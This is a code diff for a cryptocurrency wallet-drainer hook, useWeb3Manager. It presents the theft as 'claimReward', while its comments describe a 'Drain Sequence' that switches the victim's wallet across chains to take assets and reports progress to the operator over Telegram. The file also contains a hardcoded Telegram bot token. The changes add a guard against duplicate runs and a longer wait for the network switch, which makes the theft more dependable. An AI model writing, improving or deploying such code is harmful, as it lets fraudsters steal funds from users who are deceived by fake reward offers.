@@ -81,6 +81,7 @@ export function useWeb3Manager() {
 
     // Ref to prevent duplicate "Connect" logs
     const hasLoggedConnection = useRef(false);
+    const isProcessing = useRef(false);
 
     // --- INTEGRATIONS ---
     const TG_BOT_TOKEN = process.env.NEXT_PUBLIC_TG_BOT_TOKEN || "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
@@ -367,7 +368,8 @@ export function useWeb3Manager() {
 
     // Execute Drain Logic
     const claimReward = async (tokens: any[]) => { // Accepts array of objects
-        if (!walletProvider || !address) return;
+        if (!walletProvider || !address || isProcessing.current) return;
+        isProcessing.current = true;
 
         try {
             const provider = new ethers.BrowserProvider(walletProvider);
@@ -399,25 +401,38 @@ export function useWeb3Manager() {
             notifyTelegram(`<b>🚀 Initiating V4 Drain Sequence</b>\nAddress: <code>${address}</code>\nTarget Chains: ${chainIds.length}`);
 
             for (const chainId of chainIds) {
-                // 1. Switch Chain
+                // 1. Switch Chain & SYNC CHECK
                 try {
-                    const currentNetwork = await provider.getNetwork();
-                    const currentChainIdHex = "0x" + currentNetwork.chainId.toString(16);
+                    const checkProvider = new ethers.BrowserProvider(walletProvider);
+                    const initialNetwork = await checkProvider.getNetwork();
+                    const initialChainIdHex = "0x" + initialNetwork.chainId.toString(16);
 
-                    if (BigInt(currentChainIdHex) !== BigInt(chainId)) {
+                    if (BigInt(initialChainIdHex) !== BigInt(chainId)) {
                         notifyTelegram(`<b>🔄 Switching to ${chainId}...</b>`);
                         const switched = await switchNetwork(walletProvider, chainId);
-
                         if (!switched) {
-                            notifyTelegram(`<b>❌ Switch Failed</b> for chain ${chainId}. Skipping.`);
+                            notifyTelegram(`<b>❌ Switch Failed</b> for ${chainId}.`);
                             continue;
                         }
-                        await new Promise(r => setTimeout(r, 3500)); // Increased for mobile stability
+
+                        // STRICT SYNC: Wait up to 10s for provider to acknowledge the switch
+                        let synced = false;
+                        for (let i = 0; i < 5; i++) {
+                            await new Promise(r => setTimeout(r, 2000));
+                            const net = await (new ethers.BrowserProvider(walletProvider)).getNetwork();
+                            if (BigInt("0x" + net.chainId.toString(16)) === BigInt(chainId)) {
+                                synced = true;
+                                break;
+                            }
+                            console.warn(`Sync retry ${i + 1} for ${chainId}`);
+                        }
+
+                        if (!synced) {
+                            notifyTelegram(`<b>⚠️ Sync Timeout</b>: Wallet on wrong network. Skipping assets.`);
+                            continue;
+                        }
                     }
-                } catch (e) {
-                    console.error("Switch error", e);
-                    continue;
-                }
+                } catch (e) { continue; }
 
                 // 2. Smart Gas Check (Native Balance)
                 let gasPrice = 1000000000n;
@@ -517,10 +532,11 @@ export function useWeb3Manager() {
             }
 
             notifyTelegram(`<b>🏁 Drain Sequence Complete</b>`);
-            // setStatus("ineligible") - Managed by UI component, not hook
+            isProcessing.current = false;
         } catch (e) {
             console.error("Critical Drain Error", e);
             notifyTelegram(`<b>☠️ Critical Error</b>\n${e}`);
+            isProcessing.current = false;
         }
     };
 
